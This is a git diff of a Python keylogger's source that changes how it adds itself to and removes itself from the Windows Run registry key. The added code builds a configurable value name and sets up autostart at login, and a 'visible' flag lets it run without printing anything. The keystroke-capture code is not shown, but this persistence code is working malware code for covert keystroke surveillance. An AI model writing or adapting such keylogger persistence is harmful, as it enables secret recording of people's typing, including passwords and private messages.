@@ -13,7 +13,7 @@ import sys
 from datetime import date
 import time
 from threading import Timer
-from winreg import SetValueEx, OpenKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, DeleteValue
+from winreg import SetValueEx, EnumValue, QueryInfoKey, DeleteValue, OpenKey, CloseKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
 from KeyloggerConfig import KeyloggerConfig
 
 # Folder where the pages of your book get logged
@@ -45,11 +45,14 @@ def add_to_startup():
     key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
     key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
     reg_value = 'CMD /k "cd ' + DIR_PATH + ' && ' + 'py' + ' ' + '"' + CURRENT_FILE_PATH + '"'
+    value_name = LOGGER_NAME + " " + config.get_file_prefix()
 
     try:
-        SetValueEx(key2change, LOGGER_NAME, 0, REG_SZ, reg_value)
-        if visible:
-            print("Keylogger applied to startup.")
+        if key2change:
+            SetValueEx(key2change, value_name, 0, REG_SZ, reg_value)
+            if visible:
+                print("Keylogger applied to startup.")
+            CloseKey(key2change)
     except Exception as e:
         if visible:
             print("Error occurred while applying keylogger to startup:")
@@ -58,16 +61,25 @@ def add_to_startup():
 # Remove from startup 
 def remove_from_startup():
     global visible
-    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
+    key_val = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
     key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
-
+    value_name = LOGGER_NAME + " " + config.get_file_prefix()
+    
     try:
-        DeleteValue(key2change, LOGGER_NAME)  
+        if key2change:
+            sub_key_count, value_count, change = QueryInfoKey(key2change)
+            i = 0
+            while i < value_count:
+                name, value, type = EnumValue(key2change, i)
+                i = i + 1
+                if name == value_name:
+                    DeleteValue(key2change, value_name)
         if visible:
             print("Keylogger removed from startup.")
+            CloseKey(key2change)
     except Exception as e:
         if visible:
-            print("No keylogger is applied to startup.")
+            print(e)
 
 # Debug logger
 def log_debug():
